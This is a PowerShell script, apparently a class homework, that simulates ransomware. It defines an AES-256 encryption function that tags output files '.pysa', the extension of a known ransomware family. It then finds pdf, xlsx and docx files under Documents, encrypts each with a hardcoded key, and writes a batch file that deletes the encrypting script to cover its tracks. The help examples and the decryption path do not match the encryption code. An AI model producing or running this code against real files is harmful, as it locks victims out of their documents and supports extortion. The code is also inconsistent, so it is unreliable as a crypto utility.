# Invoke-AESEncryption
<# 
.SYNOPSIS 
Encryptes or Decrypts Strings or Byte-Arrays with AES 
 
.DESCRIPTION 
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC) 
 
.PARAMETER Mode 
Encryption or Decryption Mode 
 
.PARAMETER Key 
Key used to encrypt or decrypt 
 
.PARAMETER Text 
String value to encrypt or decrypt 
 
.PARAMETER Path 
Filepath for file to encrypt or decrypt 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
 
Description 
----------- 
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text. 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" 
 
Description 
----------- 
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text. 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin 
 
Description 
----------- 
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes" 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes 
 
Description 
----------- 
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin" 
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# Task 1
# Create a listing of pdf, xlsx, and docx files in Documents folder and Export to CSV
Get-ChildItem -Recurse -Include *.pdf,*.xlsx,*.docx -Path .\Documents | Export-Csv `
-Path files.csv

# Task 2
# Import CSV file.
$fileList = Import-Csv -Path .\files.csv #-Header FullName

# Loop through the CSV file
foreach ($f in $fileList) {

    # Encrypt the file
    Invoke-AESEncryption -mode encrypt -key "secret" -Path $f.FullName


}

# Task 3
# Create a file called update.bat that will contain the code to delete step2.ps1
$removeStep2 = "del C:\Users\chris.mchugh-adm\Desktop\scripting\SYS_320_SP22\Week12\homework\step2.ps1"

$removeStep2 | Out-File -FilePath .\update.bat